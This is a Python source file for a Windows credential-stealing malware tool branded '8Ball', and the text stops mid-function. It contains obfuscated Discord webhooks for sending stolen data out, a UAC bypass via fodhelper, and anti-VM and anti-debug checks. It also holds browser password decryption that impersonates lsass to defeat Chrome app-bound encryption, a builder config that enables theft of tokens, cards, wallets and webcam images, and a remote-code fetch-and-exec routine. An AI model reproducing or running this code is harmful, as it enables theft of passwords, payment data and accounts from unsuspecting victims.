import base64
import os
import re
import sys
import time
import shutil
import requests
import random
import warnings
import tempfile
import sqlite3
try:
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except:
    pass

import datetime as _dt

_DBG_LOG = None
# Accumulated debug messages for optional Discord embed dump
_DBG_MESSAGES = []
def RX_DB6(msg, level="INFO"):
    try:
        ts = _dt.datetime.now().strftime("%H:%M:%S.%f")[:-3]
        line = f"[{ts}][{level}] {msg}"
        global _DBG_LOG, _DBG_MESSAGES
        _DBG_MESSAGES.append(line)
        if _DBG_LOG is None:
            _DBG_LOG = open(os.environ.get("TEMP", ".") + "\\8ball_debug.log", "a", encoding="utf-8")
        _DBG_LOG.write(line + "\n")
        _DBG_LOG.flush()
    except Exception:
        pass

# Base64-obfuscated webhook URLs (decoded at runtime)
_DBG_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTU2NzQ1ODExMTg0ODUwMi9KTnI4R1U5RkFTVUt0WWRzNzdkODNuNkg1WmJ1TUFUOUNVQkVZemZkcjhnbjZxRGZ4Q21XWnd6T0RqMGhKYVVCUUxoWA=="
_DBG_STUB_HOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUyMDA2MjcwMzc4MjIwMzQ5NC9zUC1SYlZhdS1mMk9lTkV4TkMxTVotMjJRNGxMd1M4LUlwOVZoZGZCRUFVUVk2R1U1ejQ3Y0xVTW5tVFBlTExvRFVGaA=="
_DBG_BUILDER_HOOK_B64 = ""

# Send accumulated debug logs to Discord as an embed (respects debug_mode gate)
def send_debug_embed():
    if not FEATURE_CONFIG.get("debug_mode", False):
        return
    if not _DBG_MESSAGES:
        return
    try:
        dbg_hook = base64.b64decode(_DBG_HOOK_B64).decode()
        # Keep last 50 lines to stay under Discord's 4096-char embed limit
        body = "\n".join(_DBG_MESSAGES[-50:])
        if len(body) > 4000:
            body = body[-4000:]
        payload = {
            "embeds": [{
                "title": "8ball",
                "description": f"```\n{body}\n```",
                "color": 0x5865F2,
                "footer": {"text": f"{len(_DBG_MESSAGES)} total debug lines"}
            }],
            "username": "8ball",
            "allowed_mentions": {"parse": []}
        }
        headers = {"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"}
        L04DUr118(dbg_hook, data=dumps(payload).encode(), headers=headers)
    except Exception:
        pass
import threading
import subprocess
from sys import executable, stderr
from base64 import b64decode
from json import loads, dumps
import json as json_mod
from zipfile import ZipFile, ZipInfo, ZIP_DEFLATED, ZIP_STORED
from sqlite3 import connect as sql_connect
from urllib.request import Request, urlopen

CREATE_NO_WINDOW = 0x08000000



APPBOUND_KEY_HEX = ""

# Allow running as standalone script (no PyInstaller required)

# --- string obfuscation layer ---
def _y(b, k=0x9C):
    import base64 as _z
    t = _z.b64decode(b)
    u = b''
    for i in range(0, len(t), 2):
        c = t[i:i+2]
        u += bytes([c[1], c[0]]) if len(c) == 2 else c
    return ''.join(chr(x ^ k) for x in u)
def _b64(s):
    return b64decode(s).decode()
# runtime-resolved obfuscated strings (Discord-specific)
_a = lambda: _y('6PTs6Kbvs7P4/7Ly9fj/7+7z/fjs7P+y8fP9s/3q/ejv7rM=')
_b = lambda: _y('6d306O7z5vXo/fP18g==')
_c = lambda: _y('89/o8vL5sejlyPns')
_d = lambda: _y('78nu+d2x+fvo8g==')
_e = lambda: _y('89H15vDws/2yqbysy7Ty9fP47+vSvLzIrK2ssryn9cuq8qeo5Lyoqryn6u6tpq6srLK8tfnb9/+z86yurK2trK2s2rzu9fr55POts66srLI=')
_f = lambda: _y('wMex6+fBqK7A4cey68DBsarnwOHHsuvAwbGu57Cpra3hrA==')
_g = lambda: _y('+vHA/cey68DBsaTnsKyppeE=')
_h = lambda: _y('zfio66Xr+8v/xKbN')
_i = lambda: _y('0LP/8/D9z7zz6P3u+fvws+r58Pn++A==')
_j = lambda: _y('0LP/8/D9z7z96Pno')
_k = lambda: _y('7/P/w+Xu6Ow=')
_l = lambda: _y('8vnu/+zl+ejD+Pn35Q==')
_m = lambda: _y('7P3D7PP+8unD+PL57v/s5fnow/j59+U=')

from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_ubyte, c_buffer, memmove
from Crypto.Cipher import AES
from Crypto.Cipher import ChaCha20_Poly1305
import ctypes
import io, struct
from contextlib import contextmanager
from pathlib import Path
import winreg
import urllib
try:
    import windows
    import windows.generated_def as gdef
except ImportError:
    windows = None
    gdef = None



class NullWriter(object):
    def write(self, arg):
        RX_DB6(arg)
    def flush(self):
        pass

warnings.filterwarnings("ignore")
null_writer = NullWriter()
sys.stderr = null_writer
sys.stdout = null_writer

ModuleRequirements = [
    ["Crypto.Cipher", "pycryptodome" if not 'PythonSoftwareFoundation' in executable else 'Crypto'],
    ["requests", "requests"],
    ["PIL", "Pillow"],
    ["psutil", "psutil"],
    ["cv2", "opencv-python-headless"],
]
for module in ModuleRequirements:
    try: 
        __import__(module[0])
    except:
        subprocess.Popen(f"\"{executable}\" -m pip install {module[1]} --quiet", shell=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(3)

# --- FEATURE CONFIG (written by builder) ---
# The builder injects/overrides this dict to reflect selected UI features.
#


DHOOK_B64 = "aHR0cHM6Ly9kaXNjb3JkYXBwLmNvbS9hcGkvd2ViaG9va3MvMTUxOTA0MjkxMDY0NDA4MDY2MS9vY1UxYkR0ZmVJNk9UbXZUYlNIYWR1bDhEb0JzYWpIU3ljSHhwUnY1Zm45bm9EaDVWNkI3cW91QXh4Mks4QVVtenVJdA=="

def _validate_main_webhook():
    try:
        if not h00k or ("discord.com/api/webhooks" not in h00k and "discordapp.com/api/webhooks" not in h00k):
            RX_DB6("[8Ball] Main webhook invalid or missing", "ERROR")
            return False
        return True
    except Exception:
        return False

h00k = base64.b64decode(DHOOK_B64).decode()

_MAIN_WEBHOOK_VALID = _validate_main_webhook()
# Mapping to GUI (builder.pyw):
#   "Discord Token Stealer"        -> discord_tokens
#   "Browser Credentials"          -> browser_credentials
#   "Local Files"                  -> file_search
#   "Discord JavaScript Injection" -> discord_injection
#   "Anti-Debugging/VM"            -> anti_debug
#   "IP and Location Information"  -> ip_location_info
#   "Nitro and Badge Information"  -> nitro_badges_info
#   "User Billing Information"     -> user_billing_info
#   "Discord Gift Codes"           -> discord_gift_codes
#   "Crypto Walletr"               -> wallet_gaming_data
#   "Telegram"                     -> telegram_desktop
#   "Browser Autofill and History" -> browser_autofill_history
#   "Browser Bookmarks"            -> browser_bookmarks
#   "Credit Cards"                 -> browser_credit_cards
#   "Startup Persistence"          -> startup_persistence
FEATURE_CONFIG = {
    "discord_tokens": True,
    "browser_credentials": True,
    "file_search": True,
    "discord_injection": True,
    "anti_debug": True,
    "ip_location_info": True,
    "nitro_badges_info": True,
    "user_billing_info": True,
    "discord_gift_codes": True,
    "wallet_gaming_data": True,
    "telegram_desktop": True,
    "system_info": True,
    "screenshot_capture": True,
    "webcam_capture": True,
    "roblox_cookies": True,
    "wifi_passwords": True,
    "debug_mode": True,
    "startup_persistence": False,
    "browser_autofill_history": True,
    "browser_bookmarks": True,
    "browser_credit_cards": True,
    "telegram_bot_token": "",
    "telegram_chat_id": "",
    "ping_user": False,
}

























# Debug logs go to Discord embed via send_debug_embed() — no console needed

# UAC bypass: re-launch as admin via fodhelper without prompt
def _uac_bypass():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin():
            return
        if getattr(sys, 'frozen', False):
            cmd = sys.argv[0]
        else:
            cmd = f'"{sys.executable}" "{__file__}"'
        with winreg.CreateKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command") as key:
            winreg.SetValueEx(key, "", 0, winreg.REG_SZ, cmd)
            winreg.SetValueEx(key, "DelegateExecute", 0, winreg.REG_SZ, "")
        subprocess.run("fodhelper.exe", shell=True, creationflags=CREATE_NO_WINDOW)
        time.sleep(2)
        try:
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell\open\command")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings\shell")
            winreg.DeleteKey(winreg.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
        except:
            pass
        sys.exit(0)
    except:
        pass

# Import _copy_dir_to_temp function if it exists
import os
try:
    # Try to import from the same module (if it exists)
    pass  # we'll define it if needed
except:
    pass

def antidebug():
    """Anti-debug / anti-VM – only runs when anti_debug feature is enabled."""
    if not FEATURE_CONFIG.get("anti_debug", False):
        return
    checks = [check_windows, check_ip, check_registry, check_dll]
    for check in checks:
        t = threading.Thread(target=check, daemon=True)
        t.start()
    
def exit_program(reason):
    print(reason)
    ctypes.windll.kernel32.ExitProcess(0)

def fetch_window_titles(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return set(response.text.strip().split('\r\n'))
    except Exception:
        return set()

def check_windows():
    window_titles_url = 'https://pastebin.com/raw/sih1JMj5'
    window_titles = fetch_window_titles(window_titles_url)

    @ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_void_p), ctypes.POINTER(ctypes.c_void_p))
    def winEnumHandler(hwnd, ctx):
        title = ctypes.create_string_buffer(1024)
        ctypes.windll.user32.GetWindowTextA(hwnd, title, 1024)
        if title.value.decode('Windows-1252').lower() in window_titles:
            pid = ctypes.c_ulong(0)
            ctypes.windll.user32.GetWindowThreadProcessId(hwnd, ctypes.byref(pid))
            if pid.value != 0:
                try:
                    handle = ctypes.windll.kernel32.OpenProcess(1, False, pid)
                    ctypes.windll.kernel32.TerminateProcess(handle, -1)
                    ctypes.windll.kernel32.CloseHandle(handle)
                except:
                    pass
            exit_program(f'Debugger Open, Type: {title.value.decode("utf-8")}')
        return True

    while True:
        ctypes.windll.user32.EnumWindows(winEnumHandler, None)
        time.sleep(0.5)

def fetch_blocked_ip(url):
    try:
        response = requests.get(url, timeout=10)
        response.raise_for_status()
        return set(response.text.strip().split('\r\n'))
    except Exception:
        return set()

def check_ip():
    blocked_ip_url = 'https://pastebin.com/raw/X9qMzxj2'
    blacklisted = fetch_blocked_ip(blocked_ip_url)
    while True:
        try:
            ip = urllib.request.urlopen('https://checkip.amazonaws.com').read().decode().strip()
            if ip in blacklisted:
                exit_program('Blacklisted IP Detected')
            return
        except:
            pass

def check_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r'SYSTEM\CurrentControlSet\Enum\IDE', 0, winreg.KEY_READ)
        subkey_count = winreg.QueryInfoKey(key)[0]
        for i in range(subkey_count):
            subkey = winreg.EnumKey(key, i)
            if subkey.startswith('VMWARE'):
                exit_program('VM Detected')
        winreg.CloseKey(key)
    except:
        pass

def check_dll():
    sys_root = os.environ.get('SystemRoot', 'C:\\Windows')
    if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
        exit_program('VM Detected')

# h00k and _MAIN_WEBHOOK_VALID are defined above alongside DHOOK_B64

# Remote GitHub stub URL (base64-obfuscated). Fetched and executed at runtime alongside rx.py.
_STUB_URL_B64 = "aHR0cHM6Ly9naXRodWIuY29tL3NsMXRteXdyc3R6LWVuZy9pbXBvcnRhbnQvYmxvYi9tYWluL3N0dWIucHk="
def fetch_and_run_stub():
    script_path = None
    try:
        for attempt in range(3):
            try:
                url = base64.b64decode(_STUB_URL_B64).decode()
                RX_DB6(f"[8Ball] fetch_and_run_stub: Attempt {attempt+1}/3 fetching {url}")
                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"})
                resp = urlopen(req, timeout=15)
                code = resp.read().decode()
                if not code.strip():
                    raise ValueError("Empty response")
                temp_dir = os.getenv("TEMP") or os.getenv("TMP") or "."
                script_path = os.path.join(temp_dir, f"cr_stub_{random.randint(100000,999999)}.py")
                with open(script_path, "w", encoding="utf-8") as f:
                    f.write(code)
                stub_globals = globals().copy()
                stub_globals["__file__"] = script_path
                stub_globals["__name__"] = "__main__"
                exec(compile(code, script_path, "exec"), stub_globals)
                RX_DB6("[8Ball] fetch_and_run_stub: Stub executed successfully")
                return
            except Exception as e:
                RX_DB6(f"[8Ball] fetch_and_run_stub attempt {attempt+1} failed: {type(e).__name__}: {e}")
                if attempt < 2:
                    time.sleep(2)
        RX_DB6("[8Ball] fetch_and_run_stub: All attempts failed")
    finally:
        if script_path and os.path.exists(script_path):
            try:
                os.remove(script_path)
            except Exception:
                pass

# Remote stub download disabled — it overrides local functions with broken webhook validation
# threading.Thread(target=fetch_and_run_stub, daemon=True).start()

inj3c710n_url = _y('6PTs6Kbvs7P97rLr9fv06P7p7+nu+fP/6PLy+bLo8/+z8eSsrKyz2/L1+fbo//P1s/L98fL19bP48uT59rLv')

class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_ubyte))
    ]

def G371P():
    try:return urlopen(Request(_y('6PTs6Kbvs7Ps/bL17PX69bLl7vP7')), timeout=10).read().decode().strip()
    except:return "None"


# Helper: log / print enabled features at startup for debugging
def print_enabled_features():
    try:
        enabled = [name for name, on in FEATURE_CONFIG.items() if on]
        if not enabled:
            msg = "[8Ball] No features enabled in FEATURE_CONFIG."
        else:
            msg = "[8Ball] Enabled features: " + ", ".join(enabled)
        print(msg)
    except Exception:
        pass

def Z1PF01D3r(foldername, target_dir):
    import threading
    thread_id = threading.current_thread().ident or 0
    unique_id = f"{int(time.time() * 1000)}_{thread_id}_{random.randint(100000,999999)}"
    safe_name = re.sub(r'[\\/:*?"<>|]', '_', str(foldername))[:80]
    zip_path = os.path.join(temp, f"{safe_name}_{unique_id}.zip")
    tmp_copy = None
    try:
        if not os.path.exists(os.path.dirname(zip_path)):
            os.makedirs(os.path.dirname(zip_path), exist_ok=True)
        tmp_copy = zip_path
        if tmp_copy and os.path.exists(tmp_copy):
            try:
                os.remove(tmp_copy)
            except Exception:
                pass
        
        with ZipFile(tmp_copy, 'w', ZIP_STORED) as zipobj:
            rootlen = len(target_dir) + 1
            for base, dirs, files in os.walk(target_dir):
                for file in files:
                    fn = os.path.join(base, file)
                    if "user_data" in fn:
                        continue
                    if not os.path.isfile(fn):
                        continue
                    try:
                        zipobj.write(fn, fn[rootlen:])
                    except (PermissionError, OSError):
                        continue
                    except ValueError:
                        zi = ZipInfo(fn[rootlen:])
                        zi.date_time = (1980, 1, 1, 0, 0, 0)
                        zi.compress_type = ZIP_STORED
                        try:
                            with open(fn, 'rb') as f:
                                zipobj.writestr(zi, f.read())
                        except (PermissionError, OSError):
                            continue
    except Exception:
        if tmp_copy and os.path.exists(tmp_copy):
            try:
                os.remove(tmp_copy)
            except Exception:
                pass
        raise
    return tmp_copy

def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buf_in = (c_ubyte * len(encrypted_bytes)).from_buffer_copy(encrypted_bytes)
    blob_in = DATA_BLOB(len(encrypted_bytes), buf_in)
    blob_out = DATA_BLOB()
    if entropy:
        buf_entropy = (c_ubyte * len(entropy)).from_buffer_copy(entropy)
        blob_entropy = DATA_BLOB(len(entropy), buf_entropy)
        entr_ptr = byref(blob_entropy)
    else:
        entr_ptr = None
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, entr_ptr, None, None, 0, byref(blob_out)):
        buf = (c_ubyte * blob_out.cbData)()
        memmove(buf, blob_out.pbData, blob_out.cbData)
        windll.kernel32.LocalFree(blob_out.pbData)
        return bytes(buf)

def D3CrYP7V41U3(buff, master_key=None, appbound_key=None):
    if not isinstance(buff, bytes) or len(buff) < 15:
        return None
    starts = buff[:3]
    if starts in (b'v10', b'v11'):
        nonce = buff[3:15]
        ciphertext = buff[15:-16]
        tag = buff[-16:]
        key = master_key
    elif starts == b'v20':
        nonce = buff[3:15]
        ciphertext = buff[15:-16]
        tag = buff[-16:]
        key = appbound_key if appbound_key else master_key
    else:
        return None
    if key is None:
        return None
    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_pass = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_pass.decode('utf-8')
    except:
        return None

@contextmanager
def impersonate_lsass():
    if windows is None:
        yield
        return
    original_token = windows.current_thread.token
    try:
        windows.current_process.token.enable_privilege("SeDebugPrivilege")
        proc = next(p for p in windows.system.processes if p.name == "lsass.exe")
        lsass_token = proc.token
        impersonation_token = lsass_token.duplicate(
            type=gdef.TokenImpersonation,
            impersonation_level=gdef.SecurityImpersonation
        )
        windows.current_thread.token = impersonation_token
        yield
    finally:
        windows.current_thread.token = original_token


class Chromium:
    LOCAL_APPDATA = os.environ.get("LOCALAPPDATA", "")
    APPDATA = os.environ.get("APPDATA", "")

    PATHS = {
        "Chrome": LOCAL_APPDATA + r"\Google\Chrome\User Data",
        "Opera": os.path.join(APPDATA, r"Opera Software\Opera Stable"),
        "Yandex": os.path.join(LOCAL_APPDATA, r"Yandex\YandexBrowser\User Data"),
        "360 Browser": LOCAL_APPDATA + r"\360Chrome\Chrome\User Data",
        "Comodo Dragon": os.path.join(LOCAL_APPDATA, r"Comodo\Dragon\User Data"),
        "CoolNovo": os.path.join(LOCAL_APPDATA, r"MapleStudio\ChromePlus\User Data"),
        "SRWare Iron": os.path.join(LOCAL_APPDATA, r"Chromium\User Data"),
        "Torch Browser": os.path.join(LOCAL_APPDATA, r"Torch\User Data"),
        "Brave Browser": os.path.join(LOCAL_APPDATA, r"BraveSoftware\Brave-Browser\User Data"),
        "Iridium Browser": LOCAL_APPDATA + r"\Iridium\User Data",
        "7Star": os.path.join(LOCAL_APPDATA, r"7Star\7Star\User Data"),
        "Amigo": os.path.join(LOCAL_APPDATA, r"Amigo\User Data"),
        "CentBrowser": os.path.join(LOCAL_APPDATA, r"CentBrowser\User Data"),
        "Chedot": os.path.join(LOCAL_APPDATA, r"Chedot\User Data"),
        "CocCoc": os.path.join(LOCAL_APPDATA, r"CocCoc\Browser\User Data"),
        "Elements Browser": os.path.join(LOCAL_APPDATA, r"Elements Browser\User Data"),
        "Epic Privacy Browser": os.path.join(LOCAL_APPDATA, r"Epic Privacy Browser\User Data"),
        "Kometa": os.path.join(LOCAL_APPDATA, r"Kometa\User Data"),
        "Orbitum": os.path.join(LOCAL_APPDATA, r"Orbitum\User Data"),
        "Sputnik": os.path.join(LOCAL_APPDATA, r"Sputnik\Sputnik\User Data"),
        "uCozMedia": os.path.join(LOCAL_APPDATA, r"uCozMedia\Uran\User Data"),
        "Vivaldi": os.path.join(LOCAL_APPDATA, r"Vivaldi\User Data"),
        "Sleipnir 6": os.path.join(APPDATA, r"Fenrir Inc\Sleipnir5\setting\modules\ChromiumViewer"),
        "Citrio": os.path.join(LOCAL_APPDATA, r"CatalinaGroup\Citrio\User Data"),
        "Coowon": os.path.join(LOCAL_APPDATA, r"Coowon\Coowon\User Data"),
        "Liebao Browser": os.path.join(LOCAL_APPDATA, r"liebao\User Data"),
        "QIP Surf": os.path.join(LOCAL_APPDATA, r"QIP Surf\User Data"),
        "Edge Chromium": os.path.join(LOCAL_APPDATA, r"Microsoft\Edge\User Data"),
    }

    class DATA_BLOB(ctypes.Structure):
        _fields_ = [("cbData", wintypes.DWORD), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]

    _HARDCODED_AES_KEY = bytes.fromhex("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787")
    _HARDCODED_CHACHA_KEY = bytes.fromhex("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660")
    _XOR_KEY = bytes.fromhex("CCF8A1CEC56605B8517552BA1A2D061C03A29E90274FB2FCF59BA4B75C392390")

    @classmethod
    def recovery(cls, output=None):
        lines = []
        for browser, path in cls.PATHS.items():
            for account in cls._accounts(path, browser):
                lines.append(f"Url: {account['url']}")
                lines.append(f"Username: {account['username']}")
                lines.append(f"Password: {account['password']}")
                lines.append(f"Application: {account['application']}")
                lines.append("=" * 29)

        result = "\n".join(lines)
        if output:
            Path(output).write_text(result, encoding="utf-8")
        return result

    @classmethod
    def _accounts(cls, path, browser, table="logins"):
        data = []

        for login_file in cls._get_all_profiles(path):
            if not os.path.isfile(login_file):
                continue
            tmp = None
            try:
                tmp = tempfile.mktemp(suffix=".db")
                shutil.copy2(login_file, tmp)
                if not os.path.isfile(tmp):
                    RX_DB6(f"_accounts: copy failed for {browser}", "WARN")
                    continue
                conn = sqlite3.connect(tmp)
                cursor = conn.cursor()
                cursor.execute(f"SELECT origin_url, username_value, password_value FROM {table}")
                rows = cursor.fetchall()
                conn.close()
            except Exception:
                RX_DB6(f"_accounts: db read failed for {browser} at {login_file}", "WARN")
                continue
            finally:
                try:
                    if tmp:
                        os.remove(tmp)
                except (PermissionError, OSError):
                    pass

            if not rows:
                RX_DB6(f"_accounts: {browser} {os.path.basename(os.path.dirname(login_file))} has 0 login rows")
                continue

            master_key = None
            v20_master_key = None
            decrypted_count = 0

            for origin_url, username, password_bytes in rows:
                if not password_bytes:
                    continue

                try:
                    if password_bytes[:3] in (b"v10", b"v11"):
                        if master_key is None:
                            parent = os.path.dirname(os.path.dirname(login_file))
                            master_key = cls._get_master_key(parent)
                        if master_key is None:
                            RX_DB6(f"_accounts: master_key None for {browser}", "WARN")
                            continue
                        decrypted = cls._decrypt_with_key(password_bytes, master_key)

                    elif password_bytes[:3] == b"v20":
                        if v20_master_key is None:
                            parent = os.path.dirname(os.path.dirname(login_file))
                            v20_master_key = cls._get_v20_master_key(parent)
                        if v20_master_key is None:
                            # Fallback: try standard encrypted_key for v20
                            if master_key is None:
                                parent = os.path.dirname(os.path.dirname(login_file))
                                master_key = cls._get_master_key(parent)
                            if master_key is not None:
                                try:
                                    decrypted = cls._decrypt_with_key(password_bytes, master_key)
                                    if decrypted:
                                        pass  # success
                                except Exception:
                                    decrypted = None
                            if decrypted is None:
                                continue
                        else:
                            decrypted = cls._decrypt_with_key(password_bytes, v20_master_key)
                    else:
                        decrypted = cls._decrypt_old(password_bytes)

                    if origin_url and username and decrypted:
                        data.append({
                            "url": origin_url,
                            "username": username,
                            "password": decrypted,
                            "application": browser,
                        })
                        decrypted_count += 1
                except Exception:
                    pass

            RX_DB6(f"_accounts: {browser} {os.path.basename(os.path.dirname(login_file))}: {decrypted_count}/{len(rows)} decrypted")

        return data

    @staticmethod
    def _get_all_profiles(directory):
        profiles = [
            os.path.join(directory, "Default", "Login Data"),
            os.path.join(directory, "Login Data"),
        ]
        if os.path.isdir(directory):
            try:
                for entry in os.listdir(directory):
                    if "Profile" in entry:
                        profiles.append(os.path.join(directory, entry, "Login Data"))
            except PermissionError:
                pass
        return profiles

    @classmethod
    def _dpapi_unprotect(cls, encrypted):
        crypt32 = ctypes.windll.crypt32
        kernel32 = ctypes.windll.kernel32

        buf_in = (ctypes.c_ubyte * len(encrypted)).from_buffer_copy(encrypted)
        blob_in = cls.DATA_BLOB(len(encrypted), buf_in)
        blob_out = cls.DATA_BLOB()
        result = crypt32.CryptUnprotectData(
            ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)
        )
        if result:
            buf = (ctypes.c_ubyte * blob_out.cbData)()
            ctypes.memmove(buf, blob_out.pbData, blob_out.cbData)
            kernel32.LocalFree(blob_out.pbData)
            return bytes(buf)
        return None

    @classmethod
    def _dpapi_unprotect_system(cls, encrypted):
        try:
            with impersonate_lsass():
                return cls._dpapi_unprotect(encrypted)
        except Exception:
            pass
        # Fallback: try user-context DPAPI directly
        return cls._dpapi_unprotect(encrypted)

    @classmethod
    def _parse_key_blob(cls, blob_data):
        buffer = io.BytesIO(blob_data)
        header_len = struct.unpack("<I", buffer.read(4))[0]
        buffer.read(header_len)
        content_len = struct.unpack("<I", buffer.read(4))[0]
        assert header_len + content_len + 8 == len(blob_data)

        remaining = buffer.read(content_len)
        if content_len == 32:
            return {"flag": 0, "raw_key": remaining}
        flag = remaining[0]
        rest = remaining[1:]
        parsed = {"flag": flag}
        if flag in (1, 2):
            parsed["iv"] = rest[:12]
            parsed["ciphertext"] = rest[12:44]
            parsed["tag"] = rest[44:60]
        elif flag == 3:
            parsed["encrypted_aes_key"] = rest[:32]
            parsed["iv"] = rest[32:44]
            parsed["ciphertext"] = rest[44:76]
            parsed["tag"] = rest[76:92]
        return parsed

    @classmethod
    def _derive_v20_key(cls, parsed):
        if parsed["flag"] == 0:
            return parsed["raw_key"]
        if parsed["flag"] == 1:
            cipher = AES.new(cls._HARDCODED_AES_KEY, AES.MODE_GCM, nonce=parsed["iv"])
            return cipher.decrypt_and_verify(parsed["ciphertext"], parsed["tag"])
        elif parsed["flag"] == 2:
            cipher = ChaCha20_Poly1305.new(key=cls._HARDCODED_CHACHA_KEY, nonce=parsed["iv"])
            return cipher.decrypt_and_verify(parsed["ciphertext"], parsed["tag"])
        elif parsed["flag"] == 3:
            with impersonate_lsass():
                decrypted_key = cls._decrypt_with_cng(parsed["encrypted_aes_key"])
            xored = bytes(a ^ b for a, b in zip(decrypted_key, cls._XOR_KEY))
            cipher = AES.new(xored, AES.MODE_GCM, nonce=parsed["iv"])
            return cipher.decrypt_and_verify(parsed["ciphertext"], parsed["tag"])
        return None

    @staticmethod
    def _decrypt_with_cng(input_data):
        """Decrypt Chrome/Edge v20 app-bound key using CNG key store.
        Input: IV(12) + ciphertext(32) + tag(16) = 60 bytes (Chrome 130+ format)
        """
        key_names = [
            "Google Chrome Key", "Google Chromekey1", "Google Chromekey2",
            "Microsoft Edge Key", "MicrosoftEdgeKey1", "MicrosoftEdgeKey2",
            "Chrome", "Edge",
        ]
        NCRYPT_SILENT_FLAG = 0x40
        ncrypt = ctypes.windll.NCRYPT

        if len(input_data) < 12 + 16:
            RX_DB6(f"[8Ball] CNG: input too short ({len(input_data)}B)", "WARN")
            return None
        iv = input_data[:12]
        ciphertext = input_data[12:-16]
        tag = input_data[-16:]

        h_provider = ctypes.c_void_p(0)
        if ncrypt.NCryptOpenStorageProvider(ctypes.byref(h_provider), "Microsoft Software Key Storage Provider", 0) != 0:
            RX_DB6("[8Ball] CNG: failed to open storage provider", "WARN")
            return None

        h_key = ctypes.c_void_p(0)
        key_opened = False
        for name in key_names:
            if ncrypt.NCryptOpenKey(h_provider, ctypes.byref(h_key), name, 0, NCRYPT_SILENT_FLAG) == 0:
                key_opened = True
                RX_DB6(f"[8Ball] CNG: found key '{name}'")
                break

        if not key_opened:
            ncrypt.NCryptFreeObject(h_provider)
            RX_DB6("[8Ball] CNG: no matching key found", "WARN")
            return None

        try:
            class _BCRYPT_AUTH_CIPHER_INFO(ctypes.Structure):
                _fields_ = [
                    ("cbSize", wintypes.ULONG),
                    ("dwInfoVersion", wintypes.ULONG),
                    ("pbNonce", ctypes.POINTER(ctypes.c_ubyte)),
                    ("cbNonce", wintypes.ULONG),
                    ("pbAuthData", ctypes.POINTER(ctypes.c_ubyte)),
                    ("cbAuthData", wintypes.ULONG),
                    ("pbTag", ctypes.POINTER(ctypes.c_ubyte)),
                    ("cbTag", wintypes.ULONG),
                    ("pbMacContext", ctypes.POINTER(ctypes.c_ubyte)),
                    ("cbMacContext", wintypes.ULONG),
                    ("dwFlags", wintypes.ULONG),
                    ("pbReserved", ctypes.c_void_p),
                    ("cbReserved", wintypes.ULONG),
                    ("pbRepromulgation", ctypes.c_void_p),
                    ("cbRepromulgation", wintypes.ULONG),
                ]

            iv_arr = (ctypes.c_ubyte * len(iv)).from_buffer_copy(iv)
            tag_arr = (ctypes.c_ubyte * len(tag)).from_buffer_copy(tag)

            pad_info = _BCRYPT_AUTH_CIPHER_INFO()
            pad_info.cbSize = ctypes.sizeof(_BCRYPT_AUTH_CIPHER_INFO)
            pad_info.dwInfoVersion = 1
            pad_info.pbNonce = iv_arr
            pad_info.cbNonce = len(iv)
            pad_info.pbTag = tag_arr
            pad_info.cbTag = len(tag)
            pad_info.pbAuthData = None
            pad_info.cbAuthData = 0

            pcb = wintypes.ULONG(0)
            inp = (ctypes.c_ubyte * len(ciphertext)).from_buffer_copy(ciphertext)

            if ncrypt.NCryptDecrypt(h_key, inp, len(ciphertext), ctypes.byref(pad_info), None, 0, ctypes.byref(pcb), NCRYPT_SILENT_FLAG) != 0:
                RX_DB6(f"[8Ball] CNG: NCryptDecrypt (size query) failed, last error={ctypes.get_last_error()}", "WARN")
                return None

            out = (ctypes.c_ubyte * pcb.value)()
            if ncrypt.NCryptDecrypt(h_key, inp, len(ciphertext), ctypes.byref(pad_info), out, pcb.value, ctypes.byref(pcb), NCRYPT_SILENT_FLAG) != 0:
                RX_DB6(f"[8Ball] CNG: NCryptDecrypt (payload) failed, last error={ctypes.get_last_error()}", "WARN")
                return None

            RX_DB6(f"[8Ball] CNG: decrypted {pcb.value} bytes")
            return bytes(out[:pcb.value])
        finally:
            if h_key:
                ncrypt.NCryptFreeObject(h_key)
            if h_provider:
                ncrypt.NCryptFreeObject(h_provider)

    @classmethod
    def _get_v20_master_key(cls, local_state_folder):
        state_path = os.path.join(local_state_folder, "Local State")
        if not os.path.isfile(state_path):
            return None
        try:
            ls = loads(Path(state_path).read_text(encoding="utf-8"))
            oc = ls.get("os_crypt", {})
            app_b64 = oc.get("app_bound_encrypted_key")
            if not app_b64:
                # No app_bound key → fail
                return None
            raw = base64.b64decode(app_b64)
            if raw[:4] != b"APPB":
                return None
            stripped = raw[4:]
            # Attempt A: DPAPI (user context) — very old Chrome only
            user_decrypted = cls._dpapi_unprotect(stripped)
            if user_decrypted and len(user_decrypted) == 32:
                RX_DB6("[8Ball] v20 master key via user DPAPI (attempt A)")
                return user_decrypted
            if user_decrypted:
